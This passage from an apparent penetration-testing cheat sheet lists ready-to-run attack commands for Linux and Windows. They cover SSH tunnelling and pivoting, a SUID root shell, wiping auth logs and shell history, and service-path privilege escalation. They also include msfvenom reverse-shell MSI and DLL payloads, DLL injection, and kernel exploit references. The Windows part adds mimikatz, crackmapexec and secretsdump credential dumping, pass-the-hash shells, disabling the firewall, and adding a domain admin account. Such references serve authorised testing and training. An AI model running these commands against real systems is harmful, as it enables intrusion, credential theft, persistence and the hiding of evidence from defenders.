echo "Enter class C range (i.e., 192.168.3):"
read range
for ip in {1..254..1}; do
  host $range.$ip | grep "name pointer" | cut -d" " -f5
done
```


## Linux Network Manipulation / Exploitation

* Manipulate IP configuration
``` sh
# set IP and netmask
ifconfig eth# <ip>/<cidr>

# set virtual interface
ifconfig eth0:1 <ip>/<cidr>

# add hidden interface
ip addr add <ip>/<cidr> dev eth0

# change MTU
ifconfig eth# mtu <size>

# set gateway
route add default gw <gw_ip>

# block ip:port combination
tcpkill host <ip> and port <port>
```

* `iptables` basic commands
``` sh
# dump iptables
iptables-save -c > <outfilename>

# restore iptables from a file
iptables-restore <filename>

# flush all iptables rules
iptables -F

# allow established connections on INPUT
iptables -A INPUT -i <interface> -m state --state RELATED,ESTABLISHED -j ACCEPT

# increase throughput by turning off statefulness
iptables -t raw -L -n

# drop all packets
iptables -P INPUT DROP
```

* Allow outbound connections for common protocols
``` sh
# DNS
iptables -A OUTPUT -o <interface> -p udp -d $ip --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i <interface> -p udp -s $ip --sport 53 -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o <interface> -p tcp -d $ip --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i <interface> -p tcp -s $ip --sport 53 -m state --state ESTABLISHED -j ACCEPT

# SSH
iptables -A OUTPUT -o <interface> -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i <interface> -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

# ICMP
iptables -A OUTPUT -o <interface> -p icmp --icmp-type echo-request -j ACCEPT
iptables -A INPUT -i <interface> -p icmp --icmp-type echo-reply -j ACCEPT
```

* Allow all traffic on `localhost`
``` sh
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
```

* `iptables` multi-port global allow incoming traffic
``` sh
iptables -A INPUT -p tcp -m multiport --dports 21,80,443 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p tcp -m multiport --sports 21,80,443 -m state --state ESTABLISHED -j ACCEPT
```

* Configure port forwarding
``` sh
# enable IP forwarding; each line below is a separate method
echo "1" > /proc/sys/net/ipv4/ip_forward
sysctl net.ipv4.ip_forward=1

# bind the ports / addresses
iptables -t nat -A PREROUTING -p tcp -i <interface> -j DNAT -d <pivotip> --dport 443 -to-destination <attackip>:443
iptables -t nat -A POSTROUTING -p tcp -i <interface> -j SNAT -s <target-subnet-cidr> -d <attackip> --dport 443 -to-source <pivotip>
iptables -t filter -I FORWARD 1 -j ACCEPT
```

* SSH tunnelling
``` sh
# local port forwarding (tunnel a local port to a remote server)
ssh -N <gateway> -p <port> -L <localport>:<remotehost>:<remoteport>
        ^            ^         ^           ^            ^
        |            |         |           |            |__ the port on which our final destination's service is listening
        |            |         |           |__ the final destination of our connection (i.e., a web server)
        |            |         |__ the port we use locally to access the tunnelled connection
        |            |__ the port on which our gateway's SSH service is listening
        |__ think of this as the relay between us and where we want to go; this can also be in user@domain format

# remote port forwarding (tunnel a remote port to a local server;
# use this to directly connect to services running on an internal
# host that we have a shell on; the <remoteporttobind> port will be
# accessible on 127.0.0.1 on our attack machine if tunnelling is successful)
ssh -N <gateway> -p <port> -R <remoteporttobind>:<localhost>:<localport>
        ^            ^         ^                  ^           ^
        |            |         |                  |           |__ the port associated with the vulnerable service on the target
        |            |         |                  |__ the address on which the  (typically 127.0.0.1)
        |            |         |__ the port on which we expose the vulnerable service to our attack machine
        |            |__ the port on which our attack machine's SSH service is listening
        |__ the attack machine address from which we want to connect to the target machine

# dynamic port forwarding (set a local listening port and have it
# tunnel incoming traffic to any remote destination through a proxy)
ssh -D <localproxyport> -p <remoteport> <target>
        ^                   ^            ^
        |                   |            |__ vulnerable DMZ server which we will use to route traffic to private network(s)
        |                   |__ open port on vulnerable DMZ server through which we route traffic
        |__ local port from which incoming traffic is tunnelled

# proxychains (combine this with SSH dynamic port forwarding over port
# 8080 to access hosts within an internal network over a compromised
# DMZ machine)
proxychains nmap -sT -Pn <ip>/<cidr>
```

* `tcpdump` recipes
``` sh
# capture packets on eth0 in ascii and hex and write to file
tcpdump -i eth0 -XX -w out.pcap

# capture http traffic to 2.2.2.2
tcpdump -i eth0 port 80 dst 2.2.2.2

# show connections to a specific IP
tcpdump -i eth0 -tttt dst 192.168.1.22 and not net 192.168.1.0/24

# print all ping responses
tcpdump -i eth0 'icmp[icmptype] == icmp-echoreply'

# capture 50 DNS packets and print timestamp
tcpdump -i eth0 -c 50 -tttt 'udp and port 53'
```

* IP-banning script
``` sh
#!/bin/bash
# Ban any IP in the /24 subnet for 192.168.1.0 starting at 2
# Assumes 1 is the router and does not ban IPs .20, .21, and .22
i=2
while [ $i -le 253 ]; do
  if [ $i -ne 20 -a $i -ne 21 -a $i -ne 22 ]; then
    echo "BANNED: arp -s 192.168.1.$i"
    arp -s 192.168.1.$i 00:00:00:00:00:0a
  else
    echo "IP NOT BANNED: 192.168.1.$i"
  fi
  i=`expr $i +1`
done
```


## Linux Kernel Exploitation

* Compile a 32-bit executable
``` sh
gcc -m32 exploit-src.c -o exploit
```

* Compile a static executable
``` sh
# do the compilation; include -static-libstdc++ for C++ programs
gcc -static -static-libgcc exploit-src.c -o exploit

# ensure no dynamic linkage
ldd <exename>

# ensure no unresolved symbols; it's okay if this contains some kernel-space symbols
nm <exename> | grep " U "
```

* Simple SUID shell for ``/bin/bash``; works for ``/bin/sh``, too
``` c
int main(void)
{
  setresuid(0, 0, 0);
  system("/bin/bash");
}
```


## Linux Covering Your Tracks

* Clear history logs
``` sh
echo "" > /var/log/auth.log
echo "" > ~/.bash_history
rm ~/.bash_history -rf
history -c
```

* Disable history logging; requires logout to take effect
``` sh
export HISTFILESIZE=0
export HISTSIZE=0
unset HISTFILE
```

* Permanently send all bash history commands to `/dev/null`
``` sh
ln /dev/null ~/.bash_history -sf
```

* `kill` the current session
``` sh
kill -9 $$
```


## Windows Local Information Gathering

* Basic OS information
``` bat
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

* Host / user information
``` bat
:: computer's name
hostname

:: find current user
echo %username%
whoami

:: current user privileges
whoami /priv

:: show users on the system
net user

:: show all groups
net localgroups

:: show membership of administrators group
net localgroup administrators
```

* WMI information
``` bat
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```

* Scheduled tasks; this is quite verbose
``` bat
:: view scheduled tasks via `schtasks`
schtasks /query /fo LIST /v

:: might also be worth checking harcoded directories
dir %SystemRoot%\Tasks

:: above output is quite verbose, so transfer output and search on Kali with below
cat schtask-output.txt | grep "SYSTEM|Task To Run" | grep -B 1 SYSTEM
```

* Link running processes to started services
``` bat
tasklist /SVC
net start
```

* Examine drivers
``` bat
DRIVERQUERY
```

* Interesting files
``` bat
:: search file system for keyword filenames
dir /s *pass* == *cred* == *vnc* == *.config* == *.rar* == *.zip*

:: search certain file types for keyword "password"
findstr /si password *.xml *.ini *.txt

:: search registry for keyword "password"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

:: check OS / important files
type C:\boot.ini
type C:\winnt\win.ini
type C:\winnt\php.ini
type C:\windows\win.ini
type C:\windows\windowsupdate.log
type C:\system volume information\wpsettings.dat
type C:\windows\debug\netsetup.log
type C:\windows\php.ini
type C:\windows\repair\sam
type C:\windows\repair\security
type C:\windows\repair\software
type C:\windows\repair\system
type C:\windows\system.ini
type C:\users\administrator\desktop\desktop.ini
type C:\users\administrator\ntuser.dat
type C:\users\administrator\ntuser.ini
type C:\windows\system32\config\appevent.evt
type C:\windows\system32\config\default.sav
type C:\windows\system32\config\regback\default
type C:\windows\system32\config\regback\sam
type C:\windows\system32\config\regback\security
type C:\windows\system32\config\regback\software
type C:\windows\system32\config\regback\system
type C:\windows\system32\config\sam
type C:\windows\system32\config\secevent.evt
type C:\windows\system32\config\security.sav
type C:\windows\system32\config\software.sav
type C:\windows\system32\config\system
type C:\windows\system32\config\system.sa
type C:\windows\system32\config\system.sav
type C:\windows\system32\drivers\etc\hosts
type C:\windows\system32\eula.txt
type C:\windows\system32\license.rtf

:: check common password files
type C:\unattend.xml
type C:\unattend.txt
type C:\unattended.xml
type C:\unattended.txt
type C:\windows\Panther\Unattend.xml
type C:\windows\Panther\Unattend\Unattend.xml
type C:\sysprep.inf
type C:\sysprep.xml
type C:\sysprep\sysprep.inf
type C:\sysprep\sysprep.xml
type C:\windows\system32\sysprep.inf
type C:\windows\system32\sysprep\sysprep.xml

:: check IIS common files
type C:\inetpub\logs\logfiles
type C:\inetpub\wwwroot\global.asa
type C:\inetpub\wwwroot\index.asp
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\system32\inetsrv\metabase.xml
type C:\windows\system32\inetsrv\config\applicationhost.config
type C:\windows\system32\inetsrv\config\schema\aspnet_schema.xml

:: check apache config files
type C:\program files (x86)\apache group\apache\conf\httpd.conf
type C:\program files (x86)\apache group\apache2\conf\httpd.conf
type C:\program files (x86)\xampp\apache\conf\httpd.conf
type C:\program files\apache group\apache\conf\httpd.conf
type C:\program files\apache group\apache2\conf\httpd.conf
type C:\program files\xampp\apache\conf\httpd.conf

:: check php config files
type C:\php\php.ini
type C:\php4\php.ini
type C:\php5\php.ini

:: check mysql config files
type C:\mysql\bin\my.ini
type C:\mysql\my.cnf
type C:\mysql\my.ini
type C:\program files (x86)\mysql\mysql server 5.0\my.cnf
type C:\program files (x86)\mysql\mysql server 5.0\my.ini
type C:\program files (x86)\mysql\mysql server 5.1\my.ini
type C:\program files\mysql\mysql server 5.0\my.cnf
type C:\program files\mysql\mysql server 5.0\my.ini
type C:\program files\mysql\mysql server 5.1\my.ini
type C:\program files (x86)\mysql\my.cnf
type C:\program files (x86)\mysql\my.ini
type C:\program files\mysql\my.cnf
type C:\program files\mysql\my.ini

:: check misc config files
type C:\program files (x86)\filezilla server\filezilla server.xml
type C:\xampp\filezillaftp\filezilla server.xml
type C:\xampp\mercurymail\mercury.ini
type C:\xampp\php\php.ini
type C:\xampp\phpmyadmin\config.inc
type C:\xampp\phpmyadmin\config.inc.php
type C:\xampp\phpmyadmin\phpinfo.php
type C:\xampp\sendmail\sendmail.ini
type C:\xampp\tomcat\conf\tomcat-users.xml
type C:\xampp\tomcat\conf\web.xml
type C:\xampp\webalizer\webalizer.conf
type C:\xampp\webdav\webdav.txt

:: check controllable files
type C:\apache\log\access.log
type C:\apache\log\access_log
type C:\apache\log\error.log
type C:\apache\log\error_log
type C:\apache\logs\access.log
type C:\apache\logs\access_log
type C:\apache\logs\error.log
type C:\apache\logs\error_log
type C:\apache\php\php.ini
type C:\apache2\log\access.log
type C:\apache2\log\access_log
type C:\apache2\log\error.log
type C:\apache2\log\error_log
type C:\apache2\logs\access.log
type C:\apache2\logs\access_log
type C:\apache2\logs\error.log
type C:\apache2\logs\error_log
type C:\log\access.log
type C:\log\access_log
type C:\log\error.log
type C:\log\error_log
type C:\log\httpd\access_log
type C:\log\httpd\error_log
type C:\logs\access.log
type C:\logs\access_log
type C:\logs\error.log
type C:\logs\error_log
type C:\logs\httpd\access_log
type C:\logs\httpd\error_log
type C:\mysql\data\hostname.err
type C:\mysql\data\mysql.err
type C:\mysql\data\mysql.log
type C:\opt\xampp\logs\access.log
type C:\opt\xampp\logs\access_log
type C:\opt\xampp\logs\error.log
type C:\opt\xampp\logs\error_log
type C:\program files (x86)\apache group\apache\conf\access.log
type C:\program files (x86)\apache group\apache\conf\error.log
type C:\program files (x86)\apache group\apache\logs\access.log
type C:\program files (x86)\apache group\apache\logs\error.log
type C:\program files (x86)\mysql\data\hostname.err
type C:\program files (x86)\mysql\data\mysql-bin.log
type C:\program files (x86)\mysql\data\mysql.err
type C:\program files (x86)\mysql\data\mysql.log
type C:\program files (x86)\mysql\mysql server 5.0\data\hostname.err
type C:\program files (x86)\mysql\mysql server 5.0\data\mysql-bin.log
type C:\program files (x86)\mysql\mysql server 5.0\data\mysql.err
type C:\program files (x86)\mysql\mysql server 5.0\data\mysql.log
type C:\program files\mysql\data\hostname.err
type C:\program files\mysql\data\mysql-bin.log
type C:\program files\mysql\data\mysql.err
type C:\program files\mysql\data\mysql.log
type C:\program files\mysql\mysql server 5.0\data\hostname.err
type C:\program files\mysql\mysql server 5.0\data\mysql-bin.log
type C:\program files\mysql\mysql server 5.0\data\mysql.err
type C:\program files\mysql\mysql server 5.0\data\mysql.log
type C:\windows\iis5.log
type C:\windows\iis6.log
type C:\windows\iis7.log
type C:\windows\iis8.log
type C:\xampp\sendmail\sendmail.log
type C:\xampp\filezillaftp\logs\access.log
type C:\xampp\filezillaftp\logs\error.log
type C:\xampp\mercurymail\logs\access.log
type C:\xampp\mercurymail\logs\error.log
```


## Windows Network Information Gathering

* Basic network information
``` bat
net users
net user <username>
ipconfig /all
route print
arp -A
```

* Active connections
``` bat
:: all open ports
netstat -ano

:: mapped open ports to process; copy this from `/usr/share/windows-binaries/fport/Fport.exe` on Kali
.\Fport.exe
```

* Firewall information
``` bat
netsh firewall show state
netsh firewall show config
```

* Remote WMI querying
``` bat
wmic /node:"<node>" /user:<domain>\<username> computersystem list brief /format:list
```


## Windows Privilege Escalation Techniques / Common Exploits

* Executing a payload via a new service
``` bat
:: create the service
sc \\<ip> create <servicename> binPath="<pathtopayload>"

:: start the service; note that the service will be reported to timeout, but it will still execute our payload
sc \\<ip> start <servicename>

:: after migrating out of our relatively unstable created service, we should clean-up
del \\<ip>\<share>\<pathtopayload>
sc \\<ip> delete <servicename>
```

* Change the bin path of a service to add an admin user (such as the UPNP service) with the help of `accesschk.exe` ([officially available from Microsoft](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) but use [this older version](https://xor.cat/2017/09/05/sysinternals-accesschk-accepteula/) with the `/accepteula` flag); also see Metasploit's `exploit/windows/local/service_permissions`
``` bat
:: find all services that a user can modify; look for SERVICE_ALL_ACCESS
:: note that either -accepteula or /accepteula may be the way to specify this IMPORTANT flag
accesschk.exe -uwcqv "<username>" * -accepteula
accesschk.exe -uwcqv "Authenticated Users" * -accepteula
accesschk.exe -uwcqv "Everyone" * -accepteula
accesschk.exe -uwcqv "Users" * -accepteula

:: probe the potentially vulnerable service(s) more closely, checking for dependency services (two separate methods shown below)
accesschk.exe -ucqv <servicename> -accepteula
sc qc <servicename>

:: add the user
sc config <vulnerable_service_name> binpath= "net user <username> <password> /add"
sc stop <vulnerable_service_name>
sc start <vulnerable_service_name>

:: upgrade privilege level
sc config <vulnerable_service_name> binpath= "net localgroup Administrators <username> /add"
sc stop <vulnerable_service_name>
sc start <vulnerable_service_name>

:: also consider modifying the program pointed to by binpath if you have permissions
```

* Exploit `AlwaysInstallElevated` setting; also see Metasploit's `exploit/windows/local/always_install_elevated`
``` bat
:: query registry to see if proper settings are enabled; we are looking for DWORDs of 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

:: IMPORTANT: if on a 64-bit target, make sure to use the below instance of reg.exe
 %SystemRoot%\Sysnative\reg.exe

::  make add user payload
msfvenom -p windows/adduser USER=admin PASS=password -f msi-nouac -o filename.msi

:: or, make a generic command payload
msfvenom -p windows/exec cmd="<cmd>" -f msi-nouac > filename.msi

:: or, make reverse shell payload
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f msi -o filename.msi

:: execute one of the MSI installer payloads
msiexec /quiet /qn /i C:\Users\filename.msi
        ^      ^   ^
        |      |   |_ regular installation
        |      |_ no GUI
        |_ bypass UAC
```

* Autologon / autologin
```bat
:: query for default credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

* Unquoted service path
```bat
:: list all services with an unquoted service path; can also use `exploit/windows/local/trusted_service_path`
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

:: investigate permissions we have on any vulnerable directories
icacls "C:\Program Files\Some Folder"
accesschk.exe -dqv "C:\Program Files\Some Folder"

:: alternatively, we can look for weak folder/file permissions on all installed programs
:: these commands check for full permissions (F)
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"

:: these commands check for modify permissions (M)
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
```

* Add a user capable of connecting via `rdesktop`; useful for returning to the target from a created administrator account (if executing this command with a bin path from above method, don't forget to escape the `"`s)
``` bat
net localgroup "Remote Desktop Users" <username> /add
```

* Check the credentials manager
```bat
cmdkey /list
dir C:\Users\<user>\AppData\Local\Microsoft\Credentials\
dir C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
```

* DLL injection (use [`RemoteDLLInjector.exe`](https://securityxploded.com/remote-dll-injector.php) for Windows XP to 8; alternatives include [Metasploit](https://www.rapid7.com/db/modules/post/windows/manage/reflective_dll_inject) and [PowerSploit](https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-DllInjection/))
``` bat
:: on attack machine, make your dll payload
msfvenom -p windows/shell_reverse_tcp LHOST=<attackip> LPORT=<attackport> -f dll > ./payload.dll

:: on target machine, inject into 32-bit or 64-bit process via RemoteDLLInjector
RemoteDLLInjector32.exe <pid> <dllpath>
RemoteDLLInjector64.exe <pid> <dllpath>
```

* DLL hijacking
  * Check for processes with missing DLLs with [process monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
  * Alternatively, use PowerSploit's [`Find-ProcessDLLHijack`](https://powersploit.readthedocs.io/en/latest/Privesc/Find-ProcessDLLHijack/)
  * Check for write permissions on a folder via `icacls <path>`

* Secondary logon handle (works on lots of Windows version but requires 2 CPUs and PowerShell 2.0); use [this PowerShell script](https://www.exploit-db.com/exploits/39719/) or [binary exploit](https://github.com/khr0x40sh/ms16-032)
``` posh
# ensure that patch has not been applied
powershell -C get-hotfix -id KB3139914
powershell -C get-hotfix -id KB314314

# run PowerShell exploit
powershell -exec bypass
Import-Module .\39719.ps1
Invoke-MS16-032

# or run custom binary
.\ms16-032.exe
```

* [`sysret`](https://github.com/shjalayeri/sysret) exploit
``` bat
:: find a running system-level process and grab its PID
tasklist

:: run exploit specifying system-level process PID
.\sysret.exe -pid <pid>
```

* [Juicy Potato](https://github.com/ohpe/juicy-potato) for pivoting from Windows Service Accounts to SYSTEM
```bat
:: if our shell has SeImpersonate or SeAssignPrimaryToken privileges from `whoami /priv`, we can escalate
.\JuicyPotato.exe -t * -p <cmdtorun> -l <comserverlistenport>
                     ^
                     |__ modify this based on which privielge(s) you have
```

* Unattended install enumeration: Metasploit's `post/windows/gather/enum_unattend`

* Bypass UAC: Metasploit's `use exploit/windows/local/bypassuac`

* Launch a payload remotely through a Windows service without dropping a binary: Metasploit's `use exploit/multi/script/web_delivery`

* Detecting vulnerabilities with [Sherlock](https://github.com/rasta-mouse/Sherlock); [Watson](https://github.com/rasta-mouse/Watson) and [Seatbelt](https://github.com/GhostPack/Seatbelt) may also be worth exploring but they don't provide compiled binaries
```posh
# transfer Sherlock.ps1 to your target, import it, and run the vuln search
Import-Module Sherlock
Get-Command -module Sherlock
Find-AllVulns
```

* Enabling Remote Desktop
```bat
:: enable rdp in the registry
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f

:: above requires 'Terminal Services' service to be started; this is default, but can be manually enabled with below
reg add HKLM\System\CurrentControlSet\Services\TermService /v Start /t REG_DWORD /d 0x00000003 /f
net start termservice
```

* Common Windows exploits (comprehensive table [here](https://pentestlab.blog/2017/04/24/windows-kernel-exploits/))

  * Start by checking the patchlevel with below snippet, then reference the below table
```bat
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

| Vulnerability                                                                                            | Affected Systems |
| -------------------------------------------------------------------------------------------------------- | ---------------- |
| [Windows Vista / 7 UAC Bypass](https://www.exploit-db.com/exploits/15609/)                               | Windows Vista/2008 6.1.6000 x86 |
|                                                                                                          | Windows Vista/2008 6.1.6001 x86 |
|                                                                                                          | Windows 7 6.2.7600 x86 |
|                                                                                                          | Windows 7/2008 R2 6.2.7600 x64 |
| [`afd.sys` MS11-046](https://www.exploit-db.com/exploits/40564/)                                         | Windows XP SP3 x86 |
|                                                                                                          | Windows XP Pro SP2 x64 |
|                                                                                                          | Windows Server 2003 SP2 x86/x64 |
|                                                                                                          | Windows Vista SP1/SP2 x86/x64 |
|                                                                                                          | Windows Server 2008 x86/x64 |
|                                                                                                          | Windows Server 2008 SP2 x86/x64 |
|                                                                                                          | Windows 7 x86/x64 |
|                                                                                                          | Windows 7 SP1 x86/x64 |
|                                                                                                          | Windows Server 2008 R2 x64 |
|                                                                                                          | Windows Server 2008 R2 SP1 x64 |
| [Windows 7 SP1 (x86) WebDAV](https://www.exploit-db.com/exploits/39432/)                                 | Windows 7 SP1 x86 (build 7601) |
| (with an alternative [here](https://www.exploit-db.com/exploits/39788/))                                 | |
| [Windows 7 SP1 (x86) MS16-014](https://www.exploit-db.com/exploits/40039/)                               | Windows 7 SP1 x86 |
| [Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) MS16-032](https://www.exploit-db.com/exploits/39719/)         | Windows 7 x86/x64 |
|                                                                                                          | Windows 8 x86/x64 |
|                                                                                                          | Windows 10 |
|                                                                                                          | Windows Server 2008-2012R2 |
| [Windows COM CVE-2017-0213](https://www.exploit-db.com/exploits/42020/)                                  | Windows 10 (1511/10586, 1607/14393 & 1703/15063) |
| (with pre-compiled options [here](https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213) | Windows 7 SP1 x86/x64 |
|  and [here](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213))               | |

* Remote compiling kernel exploits on Kali
```sh
i686-w64-mingw32-gcc <fin>.c -o <fout>.exe -lws2_32
```


## Windows Password Dumping

* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (get packaged binary [here](https://github.com/maaaaz/CrackMapExecWin))

* [fgdump](http://swamp.foofus.net/fizzgig/fgdump/)

* [PwDump7](http://www.tarasco.org/security/pwdump_7/)

* Copying SYSTEM, SECURITY, and SAM hives
``` bat
reg.exe save hklm\sam C:\temp\sam.save
reg.exe save hklm\security C:\temp\security.save
reg.exe save hklm\system C:\temp\system.save
```

* Creating a snapshot of `ntds.dit`
``` bat
:: confirm the location of the ntds.dit file
reg.exe query hklm\system\currentcontrolset\services\ntds\parameters

:: run `ntdsutil` interactively and specify snapshot
ntdsutil

:: repair a broken ntds.dit file
esentutl /p /o ntds.dit
```

* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) (get packaged binaries [here](https://github.com/gentilkiwi/mimikatz/releases))
``` bat
:: ensure you have appropriate privileges
mimikatz # privilege::debug

:: simple grab
mimikatz # sekurlsa::logonpasswords

:: passing the hash
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlmhash>

:: grab in-memory credentials across a network range
.\crackmapexec smb <ip>/<cidr> -u <username> -p <password> -M mimikatz
```

* `crackmapexec` show options for a module
``` sh
crackmapexec -M <modulename> --show-options
```

* `crackmapexec` dumps via [secretsdump.py](https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py)
``` sh
# SAM
crackmapexec smb <ip>/<cidr> -u <username> -p <password> --sam

# LSA
crackmapexec smb <ip>/<cidr> -u <username> -p <password> --lsa

# NTDS.dit
crackmapexec smb <ip>/<cidr> -u <username> -p <password> --ntds
crackmapexec smb <ip>/<cidr> -u <username> -p <password> --ntds vss
crackmapexec smb <ip>/<cidr> -u <username> -p <password> --ntds-history
crackmapexec smb <ip>/<cidr> -u <username> -p <password> --ntds-pwdLastSet
```

* Pulling credentials from a dumped hive
```sh
impacket-secretsdump -ntds <ntdsfile> -system <systemfile> LOCAL
```

* Testing credentials natively
``` bat
:: test smb connection
net use \\<ip> /user:<domain>\<username> <password>

:: see if we can view an admin share
dir \\<ip>\c$

:: view open sessions
net session

:: terminate our open sessions
net use /delete *
```

* View Kali modded tools for passing the hash
``` sh
ls /usr/bin/pth-*
```

* Passing the hash to open a remote shell
``` bat
pth-winexe -U <domain>/<username>%<ntlm> //<target> cmd.exe
```

* SMB enumeration using hashed credentials
``` sh
nmap -p U:137,T:139 --script=smb-enum-groups,smb-enum-users --script-args 'smbuser=<username>,smbhash=<lmhash>' <ip>
```


## Windows Network Manipulation / Exploitation

* Exploitation frameworks
  * [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
  * [Nishang](https://github.com/samratashok/nishang)
  * [Merlin](https://github.com/Ne0nd0g/merlin)
  * [Empire](https://github.com/EmpireProject/Empire)

* Disabling the firewall
``` bat
:: newer Windows versions
netsh advfirewall set allprofiles state off

:: older Windows versions
netsh firewall set opmode disable
```

* Pivoting accounts
``` bat
:: open a new shell with a new kerberos logonid valid on the domain
:: `/netonly` option allows us to authenticate as domain user a non-domain-joined machine
runas /netonly /user:<domain>\<username> "cmd.exe"

:: check kerberos logonid
klist

:: spawn a shell as a new user
.\psexec.exe -accepteula -nobanner \\<ip> -u <domain>\<username> -p <password> cmd.exe
```

* `wmic` querying and command execution
``` bat
:: discover local administrators on a remote machine
wmic /node:<node> path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"<domain>\"")

:: see who is logged on a machine
wmic /node:<node> path win32_loggedonuser get antecedent

:: remote command execution
wmic /node:<node> /user:<domain>\<user> path win32_process call create "<cmd>"
```

* WinRM command execution via `psexec`
```bat
# force open WinRM on the target (use with caution)
.\psexec.exe \\<target> -u <domain>\<username> -p <password> -h -d powershell.exe "enable-psremoting -force"
```

* `dsquery` domain enumeration and manipulation; note that `'` acts as a wildcard
``` bat
:: list users on a domain
dsquery user -limit 0

:: list groups for a specific domain; this example uses `brian.com`
dsquery group "CN=users,DC=brian,DC=com"

:: list domain admin accounts
dsquery group -name "domain admins" | dsget group -members -expand

:: list all groups for a user
dsquery user -name <username>' | dsget user -memberof -expand

:: get a user's login ID
dsquery user -name <username>' | dsget user -samid

:: list accounts inactive for 2 weeks
dsquery user -inactive 2

:: list all operating systems on a domain; this example uses `brian.com`
dsquery ' "DC=brian,DC=com" -scope subtree -attr "cn" "operatingsystem" "operatingSystemServicePack" -filter "(&(objectClass=Computer)(objectCategory=Computer)(operatingSystem=Windows'))"

:: list all subnets within a site
dsquery subnet -site <sitename> -o rdn

:: list all servers within a site
dsquery server -site <sitename> -o rdn

:: find servers in the domain `brian.com`
dsquery ' domainroot -filter "(&(objectClass=Computer)(objectCategory=Computer)(operatingSystem='Server'))" -limit 0

:: domain controllers per site
dsquery ' "CN=Sites,CN=Configuration,DC=forestRootDomain" -filter (objectCategory=Server)

:: add a domain user to domain `brian.com`
dsadd user "CN=<username>,CN=Users,DC=brian,DC=com" -samid <loginid> -pwd <password> -display "<displayname>" -pwdneverexpires yes -memberof "CN=Domain Admins,CN=Users,DC=brian,DC=com"

:: delete a user from domain `brian.com`
dsrm -subtree -noprompt "CN=<username>,CN=Users,DC=brian,DC=com"
```

* `crackmapexec` enumeration
``` bat
:: iterate known credentials over other hosts in a subnet
.\crackmapexec <ip>/<cidr> -u <username> -p <password>

:: alternatively, authenticate using one of the below pass-the-hash methods
.\crackmapexec <ip>/<cidr> -u <username> -H <lmhash>:<nthash>
.\crackmapexec <ip>/<cidr> -u <username> -H <nthash>

:: note that -u, -p, and -H accept multiple arguments or filenames of lists

:: list currently logged in users
.\crackmapexec localhost -u <username> -p <password> --lusers

:: dump hashes of users
.\crackmapexec <ip> -u <username> -p <password> --lsa

:: execute a cmd.exe command on another host in the network via smbexec
.\crackmapexec <ip> -u <username> -p <password> --exec-method smbexec -x <cmd>

:: excute a PowerShell command directly on another host using exec method fallback
.\crackmapexec <ip> -u <username> -p <password> -X '$PSVersionTable'

:: execute PowerView cmdlet on a host; this example identifies domain admins
.\crackmapexec <ip> -u <username> -p <password> -M powerview -o COMMAND=Get-NetGroupMember
```

* Start an elevated process with known admin credentials via Powershell
```posh
# create password / credentials objects for Administrator account
$SecretPassword = ConvertTo-SecureString '<knownpassword>' -AsPlainText -Force
$Creds = New-Object System.Management.Automation.PSCredential('Administrator', $SecretPassword)

# execute a new process with elevated privileges
Start-Process -FilePath "powershell" -argumentlist "<cmd>" -Credential $Creds
```

* [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
``` posh
# begin by dropping PowerView on your target; download entire Recon directory to module path (see $Env:PSModulePath environment variable)

# after downloading, install the module in PowerShell prompt
Import-Module Recon

# view available commands
Get-Command -Module Recon

# find all users currently logged in, in a specific group
Invoke-UserHunter -GroupName <groupname>

# find local admins per machine
